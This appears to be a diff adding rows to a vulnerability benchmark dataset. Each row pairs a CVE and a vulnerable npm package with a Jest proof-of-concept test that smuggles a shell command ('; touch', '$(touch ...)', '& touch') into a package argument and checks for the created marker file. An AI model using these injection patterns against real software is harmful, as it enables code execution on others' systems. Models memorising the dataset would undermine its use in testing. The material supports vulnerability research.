+  const publisher = require(""apex-publish-static-files"");
+  const fs = require(""fs"");
+  const path = ""./apex-publish-static-files"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    publisher.publish({
+      connectString: "";touch apex-publish-static-files;"",
+      directory: ""./"",
+      appID: 111,
+    });
+  } catch (err) {
+  } finally {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  }
+});
+",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,index.js:54:25,https://security.snyk.io/vuln/SNYK-JS-APEXPUBLISHSTATICFILES-72552; https://github.com/advisories/GHSA-9jm3-5835-537m
+command-injection,CVE-2019-10776,command-exists,1.2.2,0.22.2,command-injection/command-exists_1.2.2,"test(""Command Injection in command-exists"", () => {
+  expect.assertions(2);
+  const commandExists = require(""command-exists"");
+  const fs = require(""fs"");
+  const path = ""./command-exists"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  commandExists.sync("";touch command-exists"");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,lib/command-exists.js:78:22,https://security.snyk.io/vuln/npm:command-exists:20180512; https://github.com/advisories/GHSA-84cm-v6jp-gjmr
+command-injection,CVE-2019-10776,scp,0.0.3,0.22.2,command-injection/scp_0.0.3,"test(""Command Injection in scp"", (done) => {
+  expect.assertions(2);
+  const scp = require(""scp"");
+  const fs = require(""fs"");
+  const path = ""./scp"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let options = {
+    file: ""& touch scp; #"",
+    user: ""username"",
+    host: ""myServer"",
+    port: ""20"",
+    path: ""~"",
+  };
+  scp.send(options, function (err) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,scp.js:21:3,https://security.snyk.io/vuln/SNYK-JS-SCP-1009828; https://github.com/advisories/GHSA-84cm-v6jp-gjmr
+command-injection,CVE-2020-28440,corenlp-js-interface,1.0.3,n/a,command-injection/corenlp-js-interface_1.0.3,"test(""Command Injection in corenlp-js-interface"", () => {
+  expect.assertions(2);
+  const a = require(""corenlp-js-interface"");
+  const fs = require(""fs"");
+  const path = ""./corenlp-js-interface"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a(""') touch corenlp-js-interface # '"", """", """", """");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,index.js:5:20,https://security.snyk.io/vuln/SNYK-JS-CORENLPJSINTERFACE-1050435; https://github.com/advisories/GHSA-ffxg-xm4w-3wg9
+command-injection,CVE-2017-16034,pidusage,1.0.0,1.1.5,command-injection/pidusage_1.0.0,"test(""Command Injection in pidusage"", (done) => {
+  expect.assertions(1);
+  const os = require(""os"");
+  os.platform = () => {
+    return ""freebsd"";
+  };
+  const roar_pidusage = require(""pidusage"");
+  const fs = require(""fs"");
+  const path = ""./pidusage"";
+  roar_pidusage.stat(""$(touch pidusage)"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/soyuka/pidusage/commit/b70eca15f7ca7f1b82a15f8a5d4bb48737f5a89d,lib/stats.js:108:5,https://security.snyk.io/vuln/npm:pidusage:20170605; https://github.com//advisories/GHSA-hfq9-rfpv-j8r8
+command-injection,CVE-2020-28447,xopen,1.0.0,n/a,command-injection/xopen_1.0.0,"test(""Command Injection in xopen"", () => {
+  expect.assertions(2);
+  const root = require(""xopen"");
+  const fs = require(""fs"");
+  const path = ""./xopen"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let attack_code = ""& touch xopen"";
+  return root(attack_code).finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,index.js:13:5,https://security.snyk.io/vuln/SNYK-JS-XOPEN-1050981; 
+command-injection,CVE-2020-28435,ffmpeg-sdk,0.0.5,n/a,command-injection/ffmpeg-sdk_0.0.5,"test(""Command Injection in ffmpeg-sdk"", () => {
+  expect.assertions(2);
+  const root = require(""ffmpeg-sdk"");
+  const fs = require(""fs"");
+  const path = ""./ffmpeg-sdk"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return root
+    .execute(""touch ffmpeg-sdk"")
+    .then(() => {})
+    .catch((err) => {})
+    .finally(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",n/a,index.js:9:5,https://security.snyk.io/vuln/SNYK-JS-FFMPEGSDK-1050429; 
+command-injection,CVE-2020-7636,adb-driver,0.1.8,n/a,command-injection/adb-driver_0.1.8,"test(""Command Injection in adb-driver"", () => {
+  expect.assertions(2);
+  const root = require(""adb-driver"");
+  const fs = require(""fs"");
+  const path = ""./adb-driver"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return root.execADBCommand("" & touch adb-driver"").finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,build/AdbDriver.js:26:25,https://security.snyk.io/vuln/SNYK-JS-ADBDRIVER-564430; https://github.com/advisories/GHSA-4m6q-rxhm-675w
+command-injection,CVE-2021-23363,kill-by-port,0.0.1,0.0.2,command-injection/kill-by-port_0.0.1,"test(""Command Injection in kill-by-port"", () => {
+  expect.assertions(2);
+  const kill_by_port = require(""kill-by-port"");
+  const fs = require(""fs"");
+  const path = ""./kill-by-port"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  kill_by_port.killByPort(""$(touch kill-by-port)"");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, () => {});
+});
+",https://github.com/GuyMograbi/kill-by-port/commit/ea5b1f377e196a4492e05ff070eba8b30b7372c4,index.js:8:17,https://security.snyk.io/vuln/SNYK-JS-KILLBYPORT-1078531; https://github.com/advisories/GHSA-mm4f-47ch-f7hx
+command-injection,CVE-2020-15123,codecov,3.6.4,3.7.1,command-injection/codecov_3.6.4,"process.on(""unhandledRejection"", () => {});
+test(""Command Injection in codecov"", async () => {
+  expect.assertions(2);
+  const root = require(""codecov"");
+  const fs = require(""fs"");
+  const path = ""./codecov"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let args = {
+    options: {
+      ""gcov-root"": ""& touch codecov &"",
+      ""gcov-exec"": "" "",
+      ""gcov-args"": "" "",
+    },
+  };
+  try {
+    await root.handleInput.upload(
+      args,
+      function () {
+        console.log(""success"");
+      },
+      function () {
+        console.log(""Fail!"");
+      }
+    );
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/codecov/codecov-node/commit/c0711c656686e902af2cd92d6aecc8074de4d83d,lib/codecov.js:419:7,https://security.snyk.io/vuln/SNYK-JS-CODECOV-585979; https://github.com/advisories/GHSA-xp63-6vf5-xf3v
+command-injection,CVE-2020-7794,buns,1.1.6,n/a,command-injection/buns_1.1.6,"test(""Command Injection in buns"", () => {
+  expect.assertions(2);
+  var root = require(""buns"");
+  const fs = require(""fs"");
+  const path = ""./buns"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  var name = ""& touch buns"";
+  try {
+    root.install(name);
+  } catch (error) {
+  } finally {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  }
+});
+",n/a,lib/index.js:678:9,https://security.snyk.io/vuln/SNYK-JS-BUNS-1050389; https://github.com/advisories/GHSA-487w-pqcm-63hq
+command-injection,CVE-2021-23359,port-killer,1.0.1,n/a,command-injection/port-killer_1.0.1,"test(""Command Injection in port-killer"", () => {
+  expect.assertions(2);
+  const port_killer = require(""port-killer"");
+  const fs = require(""fs"");
+  const path = ""./port-killer"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  port_killer(""$(touch port-killer)"");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,index.js:19:9,https://security.snyk.io/vuln/SNYK-JS-PORTKILLER-1078533; https://github.com/advisories/GHSA-2548-q746-x5x6
+command-injection,CVE-2020-28431,wc-cmd,1.0.9,n/a,command-injection/wc-cmd_1.0.9,"test(""Command Injection in wc-cmd"", (done) => {
+  expect.assertions(2);
+  const a = require(""wc-cmd"");
+  const fs = require(""fs"");
+  const path = ""./wc-cmd"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a(""touch wc-cmd"", () => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,index.js:49:19,https://security.snyk.io/vuln/SNYK-JS-WCCMD-1050423; https://github.com/advisories/GHSA-mx3r-w3pj-7wv7
+command-injection,CVE-2015-7982,gm,1.20.0,=1.20.0,command-injection/gm_1.20.0,"const { doesNotMatch } = require(""assert"");
+test(""Command Injection in gm"", (done) => {
+  expect.assertions(2);
+  const gm = require(""gm"");
+  const fs = require(""fs"");
+  const path = ""./gm"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  gm.compare(""$(touch gm)"", ""/path/to/another.png"", function (
+    err,
+    isEqual,
+    equality,
+    raw,
+    path1,
+    path2
+  ) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/compare.js:72:5,https://security.snyk.io/vuln/npm:gm:20151026; https://github.com/advisories/GHSA-pjh3-jv7w-9jpr
+command-injection,CVE-2021-23355,ps-kill,1.0.0,n/a,command-injection/ps-kill_1.0.0,"test(""Command Injection in ps-kill"", (done) => {
+  expect.assertions(3);
+  expect.assertions(2);
+  const ps_kill = require(""ps-kill"");
+  const fs = require(""fs"");
+  const path = ""./ps-kill"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  ps_kill.kill(""$(touch ps-kill)"", function (error) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,index.js:8:3,https://security.snyk.io/vuln/SNYK-JS-PSKILL-1078529; https://github.com/advisories/GHSA-7qmm-q394-fmch
+command-injection,CVE-2020-26707,aaptjs,1.3.1,n/a,command-injection/aaptjs_1.3.1,"test(""Remote code execution in aaptjs"", (done) => {
+  const aaptjs = require(""aaptjs"");
+  const fs = require(""fs"");
+  const path = ""./aaptjs"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    aaptjs.list(""; touch aaptjs"", (err, data) => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {
+        done();
+      });
+    });
+  } catch (error) {}
+});
+",n/a,index.js:18:3,https://security.snyk.io/vuln/SNYK-JS-AAPTJS-1769273; https://github.com/advisories/GHSA-m7p2-ghfh-pjvx
+command-injection,CVE-2020-28439,corenlp-js-prefab,1.0.1,n/a,command-injection/corenlp-js-prefab_1.0.1,"test(""Command Injection in corenlp-js-prefab"", (done) => {
+  expect.assertions(2);
+  const a = require(""corenlp-js-prefab"");
+  const fs = require(""fs"");
+  const path = ""./corenlp-js-prefab"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    a.process(""') touch corenlp-js-prefab # '"");
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {
+    done();
+  });
+});
+",n/a,index.js:10:16,https://security.snyk.io/vuln/SNYK-JS-CORENLPJSPREFAB-1050434; https://github.com/advisories/GHSA-h73g-8g27-xxcx
+command-injection,CVE-2020-28436,google-cloudstorage-commands,0.0.1,n/a,command-injection/google-cloudstorage-commands_0.0.1,"test(""Command Injection in google-cloudstorage-commands"", () => {
+  expect.assertions(2);
+  var root = require(""google-cloudstorage-commands"");
+  const fs = require(""fs"");
+  const path = ""./google-cloudstorage-commands"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return root
+    .upload(""./"", ""& touch google-cloudstorage-commands"", true)
+    .finally(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",n/a,index.js:11:24,https://security.snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431; 
+command-injection,CVE-2019-10783,lsof,0.1.0,n/a,command-injection/lsof_0.1.0,"const { doesNotMatch } = require(""assert"");
+test(""Command Injection in lsof"", (done) => {
+  expect.assertions(2);
+  const root = require(""lsof"");
+  const fs = require(""fs"");
+  const path = ""./lsof"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let attack_code = ""& touch lsof &"";
+  root.rawTcpPort(attack_code, function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/lsof.js:37:8,https://security.snyk.io/vuln/SNYK-JS-LSOF-543632; https://github.com/advisories/GHSA-whq6-mj2r-mjqc
+command-injection,CVE-2018-13797,macaddress,0.2.8,0.2.9,command-injection/macaddress_0.2.8,"test(""Command Injection in macaddress"", (done) => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const path = ""./macaddress"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let iface = ""; touch macaddress; echo "";
+  require(""macaddress"").one(iface, function (err, mac) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/scravy/node-macaddress/commit/358fd594adb196a86b94ac9c691f69fe5dad2332,lib/unix.js:4:5,https://security.snyk.io/vuln/npm:macaddress:20180511; https://github.com/advisories/GHSA-pp57-mqmh-44h7
+command-injection,CVE-2020-7624,effect,1.0.4,n/a,command-injection/effect_1.0.4,"test(""Command Injection in effect"", (done) => {
+  expect.assertions(2);
+  const Root = require(""effect"");
+  const fs = require(""fs"");
+  const path = ""./effect"";
+  var options = { image: ""& touch effect"" };
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  Root.edge(options, () => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    try {
+      fs.unlinkSync(""-colorspace"");
+      fs.unlinkSync(""-edge"");
+      fs.unlinkSync(""-negate"");
+      fs.unlinkSync(""-resize"");
+      fs.unlinkSync(""5"");
+      fs.unlinkSync(""100%"");
+      fs.unlinkSync(""Gray"");
+      fs.unlinkSync(path);
+    } catch (err) {}
+    done();
+  });
+});
+",n/a,helper.js:24:5,https://security.snyk.io/vuln/SNYK-JS-EFFECT-564256; 
+command-injection,CVE-2019-15597,node-df,0.1.4,n/a,command-injection/node-df_0.1.4,"test(""Command Injection in node-df"", (done) => {
+  expect.assertions(2);
+  const df = require(""node-df"");
+  const fs = require(""fs"");
+  const path = ""./node-df"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let options = {
+    file: ""/;touch node-df"",
+    prefixMultiplier: ""GB"",
+    isDisplayPrefixMultiplier: true,
+    precision: 2,
+  };
+  df(options, function (error, response) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/index.js:41:5,https://security.snyk.io/vuln/SNYK-JS-NODEDF-536779; https://github.com/advisories/GHSA-wp7m-mrvf-599c
+command-injection,,extra-asciinema,1.0.0,1.0.23,command-injection/extra-asciinema_1.0.0,"test(""Command Injection in extra-asciinema"", (done) => {
+  expect.assertions(2);
+  const asciinema = require(""extra-asciinema"");
+  const fs = require(""fs"");
+  const path = ""./extra-asciinema"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  asciinema.uploadSync(""; touch extra-asciinema"");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {
+    done();
+  });
+});
+",https://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480,index.js:208:20,https://security.snyk.io/vuln/SNYK-JS-EXTRAASCIINEMA-608292; 
+command-injection,CVE-2020-8178,install-package,0.4.17,n/a,command-injection/jison_0.4.17,"test(""Command Injection in jison"", (done) => {
+  expect.assertions(2);
+  exec = require(""child_process"").exec;
+  const fs = require(""fs"");
+  const path = ""./jison"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let command = ""; touch jison"";
+  exec(""jison "" + command, function (error) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,build/queueRunner.js:45:12,https://security.snyk.io/vuln/SNYK-JS-JISON-570539; https://github.com/advisories/GHSA-vr9x-mm65-2438
+command-injection,CVE-2021-23377,lycwed-spritesheetjs,1.2.5,n/a,command-injection/lycwed-spritesheetjs_1.2.5,"test(""Command Injection in lycwed-spritesheetjs"", (done) => {
+  expect.assertions(2);
+  let spritesheet = require(""lycwed-spritesheetjs"");
+  const fs = require(""fs"");
+  const path = ""./lycwed-spritesheetjs"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  spritesheet(
+    ""./"",
+    {
+      fuzz: ""& touch lycwed-spritesheetjs #"",
+      ext: ""json"",
+    },
+    function () {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {
+        done();
+      });
+    }
+  );
+});
+",n/a,lib/generator.js:85:7,https://security.snyk.io/vuln/SNYK-JS-LYCWEDSPRITESHEETJS-1050428; https://github.com/advisories/GHSA-rhwp-9vm9-547q
+command-injection,CVE-2018-16460,ps,0.0.2,1.0.0,command-injection/ps_0.0.2,"test(""Command Injection in ps"", (done) => {
+  expect.assertions(2);
+  const ps = require(""ps"");
+  const fs = require(""fs"");
+  const path = ""./ps"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  ps.lookup({ pid: ""$(touch ps)"" }, function (err, proc) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/index.js:8:5,https://security.snyk.io/vuln/SNYK-JS-PS-72307; https://github.com/advisories/GHSA-cfhg-9x44-78h2
+command-injection,CVE-2020-7795,get-npm-package-version,1.0.6,1.0.7,command-injection/get-npm-package-version_1.0.6,"test(""Command Injection in get-npm-package-version"", () => {
+  expect.assertions(2);
+  const a = require(""get-npm-package-version"");
+  const fs = require(""fs"");
+  const path = ""./get-npm-package-version"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a(""& touch get-npm-package-version"");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/hoperyy/get-npm-package-version/commit/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec,index.js:16:48,https://security.snyk.io/vuln/SNYK-JS-GETNPMPACKAGEVERSION-1050390; 
+command-injection,CVE-2019-15597,xps,1.0.2,n/a,command-injection/xps_1.0.2,"test(""Command Injection in xps"", (done) => {
+  expect.assertions(2);
+  const ps = require(""xps"");
+  const fs = require(""fs"");
+  const path = ""./xps"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  ps.kill(""`touch xps;`"").fork(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/sorellabs/xps/commit/768481146b8ead3811310eecc0f56e2d107cb740,lib/utils.js:28:5,https://security.snyk.io/vuln/SNYK-JS-XPS-590098; https://github.com/advisories/GHSA-wp7m-mrvf-599c
+command-injection,CVE-2018-3757,pdf-image,1.0.5,2.0.1,command-injection/pdf-image_1.0.5,"test(""Command Injection in pdf-image"", () => {
+  expect.assertions(2);
+  const PDFImage = require(""pdf-image"").PDFImage;
+  const fs = require(""fs"");
+  const path = ""./pdf-image"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let pdfImage = new PDFImage('asd.pdf""; touch pdf-image""');
+  try {
+    return pdfImage.numberOfPages().then(function (imagePath) {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+  } catch (e) {}
+});
+",https://github.com/roest01/node-pdf-image/commit/54679496a89738443917608c2bbe2f6e5dd20e83,index.js:43:7,https://security.snyk.io/vuln/npm:pdf-image:20180529; https://github.com/advisories/GHSA-5gwh-g79j-vh4q
+command-injection,CVE-2020-7730,bestzip,2.1.6,2.1.7,command-injection/bestzip_2.1.6,"test(""Command Injection in bestzip"", (done) => {
+  expect.assertions(2);
+  const zip = require(""bestzip"");
+  const fs = require(""fs"");
+  const path = ""./bestzip"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  zip({
+    source: """",
+    destination: ""./; touch bestzip"",
+  }).finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+    done();
+  });
+});
+",https://github.com/nfriedly/node-bestzip/commit/45d4a901478c6a8f396c8b959dd6cf8fd3f955b6,lib/bestzip.js:27:27,https://security.snyk.io/vuln/SNYK-JS-BESTZIP-609371; https://github.com/advisories/GHSA-6xv6-jpvw-cx6q
+command-injection,,git-lib,1.6.0,n/a,command-injection/git-lib_1.6.0,"test(""Remote code execution in git-lib"", () => {
+  expect.assertions(2);
+  const git = require(""git-lib"");
+  const fs = require(""fs"");
+  const path = ""./git-lib"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    return git.add(""test;touch git-lib;"").finally(function () {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+  } catch (error) {}
+});
+",n/a,git.js:13:9,https://security.snyk.io/vuln/SNYK-JS-GITLIB-1012734; 
+command-injection,CVE-2021-23377,onion-oled-js,0.0.2,n/a,command-injection/onion-oled-js_0.0.2,"test(""Command Injection in onion-oled-js"", () => {
+  expect.assertions(2);
+  const OLEDExp = require(""onion-oled-js"").OLEDExp;
+  const fs = require(""fs"");
+  const path = ""./onion-oled-js"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return OLEDExp.scroll("";touch onion-oled-js #"").finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,src/oled-exp.js:91:16,https://security.snyk.io/vuln/SNYK-JS-ONIONOLEDJS-1078808; https://github.com/advisories/GHSA-rhwp-9vm9-547q
+command-injection,,gry,5.0.8,6.0.0,command-injection/gry_5.0.8,"test(""Command Injection in gry"", (done) => {
+  expect.assertions(2);
+  const Repo = require(""gry"");
+  const fs = require(""fs"");
+  const path = ""./gry"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let myRepo = new Repo(""."");
+  myRepo.pull(""test; touch gry; #"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/index.js:88:20,https://security.snyk.io/vuln/SNYK-JS-GRY-566987; 
+command-injection,CVE-2018-3772,whereis,0.4.0,0.4.1,command-injection/whereis_0.4.0,"test(""Command Injection in whereis"", (done) => {
+  expect.assertions(2);
+  const whereis = require(""whereis"");
+  const fs = require(""fs"");
+  const path = ""./whereis"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let filename = ""; touch whereis"";
+  whereis(filename, () => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/vvo/node-whereis/commit/0f64e3780235004fb6e43bfd153ea3e0e210ee2b,index.js:4:6,https://security.snyk.io/vuln/npm:whereis:20180401; https://github.com/advisories/GHSA-wjr4-2jgw-hmv8
